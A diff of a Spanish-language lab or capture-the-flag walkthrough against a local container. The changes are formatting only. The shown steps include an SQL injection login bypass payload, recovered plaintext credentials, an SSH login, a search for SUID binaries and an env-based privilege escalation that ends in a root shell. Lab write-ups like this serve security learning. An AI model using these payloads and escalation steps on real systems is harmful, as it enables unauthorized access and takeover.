@@ -6,7 +6,6 @@
 
 ```
 ping -c 3 172.17.0.2
-
 ```
 <p>Al realizar este comando enviará solo 3 paquetes ping a dirección ip designada (172.17.0.2) y luego terminará.</p>
 
@@ -107,7 +106,6 @@ imagen
 
 ```
  'or 1=1-- - 
-
 ```
 
 imagen 
@@ -117,7 +115,6 @@ imagen
 ```
 user : dylan
 contraseña: KJSDFG789FGSDF78
-
 ```
 
 Imagen 
@@ -127,7 +124,6 @@ Imagen
 ```
 ssh dylan@172.17.0.2
 contraseña: KJSDFG789FGSDF78
-
 ```
 
 # Escala de Privilegios
@@ -135,7 +131,6 @@ contraseña: KJSDFG789FGSDF78
 
 ```
 find / -perm -4000 -user root 2>/dev/null
-
 ```
 ```
 dylan@c890d134d17f:~$ find / -perm -4000 -user root 2>/dev/null
@@ -158,14 +153,12 @@ dylan@c890d134d17f:~$
 
 ```
 ./env /bin/sh -p
-
 ```
 
 <p>Al ejecutarlo nos figura este error.</p>
 
 ```
 -bash: ./env: No such file or directory
-
 ```
 
 <p>Para solucionarlo, tenemos que ejecutarlo en el directorio /usr/bin .</p>
@@ -174,3 +167,4 @@ dylan@c890d134d17f:~$
 dylan@c890d134d17f:/usr/bin$ ./env /bin/sh -p
 # whoami
 root
+```
